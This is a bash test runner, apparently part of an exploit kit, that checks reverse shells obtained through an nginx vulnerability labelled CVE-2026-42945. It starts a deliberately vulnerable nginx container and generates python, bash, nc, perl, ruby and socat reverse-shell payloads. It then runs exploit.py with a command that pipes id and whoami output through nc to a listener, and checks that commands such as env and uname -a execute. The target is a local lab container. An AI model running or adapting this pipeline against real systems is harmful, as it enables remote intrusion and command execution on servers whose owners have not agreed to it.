#!/bin/bash
# shell_test_runner.sh — Automated reverse shell verification pipeline
# Tests all shell types, runs verification, and reports results.
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
SHELL_DIR="$ROOT/shell"
RESULTS="$ROOT/results/shell_test"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

mkdir -p "$RESULTS"
PASS=0
FAIL=0
SKIP=0

GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

log()  { echo -e "${CYAN}[$(date +%H:%M:%S)]${NC} $1"; }
pass() { echo -e "  ${GREEN}[PASS]${NC} $1"; PASS=$((PASS+1)); }
fail() { echo -e "  ${RED}[FAIL]${NC} $1"; FAIL=$((FAIL+1)); }
skip() { echo -e "  ${YELLOW}[SKIP]${NC} $1"; SKIP=$((SKIP+1)); }

banner() {
    echo ""
    echo "================================================"
    echo " $1"
    echo "================================================"
}

alive() { python3 "$ROOT/exploit/trigger.py" --check-alive > /dev/null 2>&1; }

cleanup() {
    log "Cleaning up..."
    docker kill nginx-shell-test 2>/dev/null || true
    docker rm nginx-shell-test 2>/dev/null || true
    kill %1 2>/dev/null || true
}
trap cleanup EXIT

# ===========================================================================
banner "CVE-2026-42945 — Reverse Shell Verification Pipeline"
log "Results: $RESULTS"
log ""

# ---------------------------------------------------------------------------
# Phase 1: Prerequisites
# ---------------------------------------------------------------------------
banner "Phase 1: Prerequisites"

log "Checking required tools..."
for cmd in python3 docker curl nc; do
    command -v "$cmd" >/dev/null 2>&1 && pass "$cmd found" || fail "$cmd not found"
done

log "Checking Python modules..."
python3 -c "import socket, subprocess, threading, json" 2>/dev/null && \
    pass "Python modules OK" || fail "Missing Python modules"

log "Starting vulnerable nginx container..."
docker kill nginx-shell-test 2>/dev/null || true
docker run -d --rm --name nginx-shell-test \
    --cap-add SYS_PTRACE \
    --security-opt seccomp=unconfined \
    -p 19321:19321 \
    -p 19322:19322 \
    -t "$(docker build -q -f "$ROOT/docker/Dockerfile.patched" \
        --build-arg NGINX_TYPE=vulnerable "$ROOT" 2>/dev/null)" 2>/dev/null || \
    (cd "$ROOT/docker" && docker compose up -d 2>/dev/null) || \
    { log "Cannot start nginx container"; fail "docker start"; exit 1; }

log "Waiting for nginx..."
for i in $(seq 1 15); do
    alive && { pass "nginx responsive after ${i}s"; break; }
    sleep 1
done
alive || { fail "nginx not responding"; exit 1; }

# ---------------------------------------------------------------------------
# Phase 2: Listener Dry-Run
# ---------------------------------------------------------------------------
banner "Phase 2: Listener Dry-Run"

log "Testing listener in dry-run mode..."
if python3 "$SHELL_DIR/shell_verify.py" --dry-run --listen-port 1337 \
    > "$RESULTS/dry_run.txt" 2>&1; then
    pass "Listener dry-run"
else
    fail "Listener dry-run (see $RESULTS/dry_run.txt)"
fi

# ---------------------------------------------------------------------------
# Phase 3: Verify Each Shell Type
# ---------------------------------------------------------------------------
banner "Phase 3: Shell Type Verification"

SHELL_TYPES=("python" "bash" "nc" "perl" "ruby" "socat")

for shell_type in "${SHELL_TYPES[@]}"; do
    log "Testing $shell_type reverse shell..."
    log "  Generating payload..."

    PAYLOAD=$(python3 "$SHELL_DIR/shell_payloads.py" \
        --type "$shell_type" \
        --host "172.17.0.1" \
        --port 1337 \
        --limit 1 2>/dev/null | grep -v '^#' | grep -v '^$' | grep -v '^\[' | head -1)

    if [ -z "$PAYLOAD" ]; then
        skip "$shell_type (payload generation failed)"
        continue
    fi
    log "  Payload: ${PAYLOAD:0:80}..."

    log "  Starting verify listener..."
    python3 "$SHELL_DIR/shell_verify.py" \
        --target 127.0.0.1 --port 19321 \
        --listen-port 1337 \
        --shell-type "$shell_type" \
        --verify-cmds "id,whoami,hostname" \
        --timeout 45 \
        --tries 3 \
        --json \
        > "$RESULTS/${shell_type}_verify.json" 2>/dev/null && \
        pass "$shell_type reverse shell" || \
        fail "$shell_type reverse shell (see $RESULTS/${shell_type}_verify.json)"

    # Brief cooldown between shell types
    sleep 2
done

# ---------------------------------------------------------------------------
# Phase 4: Multi-Command Verification
# ---------------------------------------------------------------------------
banner "Phase 4: Multi-Command Verification"

log "Testing multi-command capture..."
for cmd_set in "id,whoami,hostname,ls /tmp,pwd" "uname -a,cat /etc/hostname,env"; do
    log "  Commands: $cmd_set"
    python3 "$SHELL_DIR/shell_verify.py" \
        --target 127.0.0.1 --port 19321 \
        --listen-port 1338 \
        --shell-type python \
        --verify-cmds "$cmd_set" \
        --timeout 45 \
        --tries 3 \
        --json \
        > "$RESULTS/multicmd_verify.json" 2>/dev/null && \
        pass "multi-cmd: $cmd_set" || \
        fail "multi-cmd: $cmd_set"
    sleep 2
done

# ---------------------------------------------------------------------------
# Phase 5: Interactive Session Verification
# ---------------------------------------------------------------------------
banner "Phase 5: Interactive Session (Quick Test)"

log "Starting interactive listener in background..."
python3 "$SHELL_DIR/shell_listener.py" --port 1339 --interactive &
LISTENER_PID=$!
sleep 2

log "Running exploit with --shell flag..."
python3 "$ROOT/exploit/exploit.py" \
    --host 127.0.0.1 --port 19321 \
    --cmd "bash -c 'echo SHELL_VERIFIED_SUCCESSFULLY; id; whoami' | nc 172.17.0.1 1339" \
    --tries 3 \
    > "$RESULTS/interactive_test.txt" 2>&1 || true

sleep 5
kill $LISTENER_PID 2>/dev/null || true
wait $LISTENER_PID 2>/dev/null || true

if grep -q "SHELL_VERIFIED" "$RESULTS/interactive_test.txt" 2>/dev/null; then
    pass "Interactive shell"
else
    fail "Interactive shell (see $RESULTS/interactive_test.txt)"
fi

# ---------------------------------------------------------------------------
# Phase 6: Report
# ---------------------------------------------------------------------------
banner "Verification Complete"

TOTAL=$((PASS+FAIL+SKIP))
echo -e "  ${GREEN}Pass:${NC}  $PASS"
echo -e "  ${RED}Fail:${NC}  $FAIL"
echo -e "  ${YELLOW}Skip:${NC}  $SKIP"
echo -e "  Total: $TOTAL"
echo ""
echo "Results: $RESULTS"
echo ""

# Generate summary JSON
cat > "$RESULTS/summary_$TIMESTAMP.json" << EOF
{
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "test": "reverse_shell_verification",
  "cve": "CVE-2026-42945",
  "pass": $PASS,
  "fail": $FAIL,
  "skip": $SKIP,
  "total": $TOTAL,
  "results_dir": "$RESULTS"
}
EOF

echo "Summary saved: $RESULTS/summary_$TIMESTAMP.json"
echo ""

if [ "$FAIL" -gt 0 ]; then
    echo -e "${RED}Some shell verifications failed.${NC}"
    echo "Check individual output files in $RESULTS"
    echo ""
    echo "Common issues:"
    echo "  - Is the callback IP correct? (default 172.17.0.1 for Docker)"
    echo "  - Is the listener port accessible from the container?"
    echo "  - Does the container have the shell binary available?"
    echo "  - Try: python3 shell/shell_verify.py -v"
    exit 1
else
    echo -e "${GREEN}All reverse shell verifications passed!${NC}"
    exit 0
fi
